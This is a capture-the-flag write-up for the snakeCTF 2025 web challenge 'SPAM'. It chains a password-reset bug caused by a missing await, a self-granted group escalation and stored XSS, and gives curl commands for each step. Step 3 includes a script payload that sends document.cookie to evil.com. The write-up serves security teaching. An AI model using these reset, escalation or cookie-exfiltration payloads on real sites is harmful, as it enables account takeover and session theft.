# SPAM [_snakeCTF 2025 Quals_]

**Category**: Web
**Author**: macedonga

## Description

The Italian government's latest digital authentication masterpiece.
Built by the lowest bidder with the highest confidence. What could go wrong?

### Hints

- Sometimes promises aren't kept, especially with governments.
- Groups can be very... flexible in their membership requirements.
- Internal systems trust each other a bit too much.
- The test service renders things quite literally.

## Solution

The challenge requires chaining four distinct vulnerabilities to achieve XSS in the admin bot's browser context and exfiltrate the flag from cookies.

### Step 1: Insecure Password Reset

The password reset functionality contains a critical async/await bug. In `/api/auth/forgot.js`, the database query validation is missing an `await` statement:

```javascript
const tokenData = db.getResetToken(token); // Missing await
if (!tokenData) {
    // This check always passes because tokenData is a Promise (truthy)
}
```

Since `tokenData` is an unresolved Promise object, it is always truthy, causing the validation to pass regardless of token validity. When the code attempts to access `tokenData.userId`, it receives `undefined`, which causes `getUserFromId` to default to user ID 0 (the admin).

A password reset can be performed with any arbitrary token:

```bash
curl -X PATCH http://challenge.snakectf.org/api/auth/forgot \
  -H "Content-Type: application/json" \
  -d '{"token": "fake_token", "newPassword": "Pwned12345!"}'
```

### Step 2: Privilege Escalation via Group Assignment

After gaining admin access, the `assignGroup` action in `/api/actions` can be exploited. The endpoint lacks proper authorization checks preventing admins from assigning themselves to privileged groups.

The admin account can be elevated to the "System" group:

```bash
curl -X POST http://challenge.snakectf.org/api/actions \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <admin_token>" \
  -d '{"action": "assignGroup", "params": {"userId": 0, "groupId": 0}}'
```

### Step 3: Stored XSS via Internal API

With "System" group privileges, access is granted to the `/api/internal/sync` internal API endpoint and the test service (platform 0). The `/api/internal/sync` endpoint allows profile updates without proper input sanitization:

```bash
curl -X POST http://challenge.snakectf.org/api/internal/sync \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <system_token>" \
  -d '{"firstName": "<script>fetch(\"https://evil.com/?c=\" + document.cookie)</script>"}'
```

### Step 4: XSS Execution in Test Service

The "test" service (platform 0) renders user profiles directly into HTML without sanitization. When the admin bot navigates to the test service dashboard, it executes the injected JavaScript payload.

The malicious script runs in the bot's browser context, extracting cookies containing the flag and sending them to the attacker's controlled server.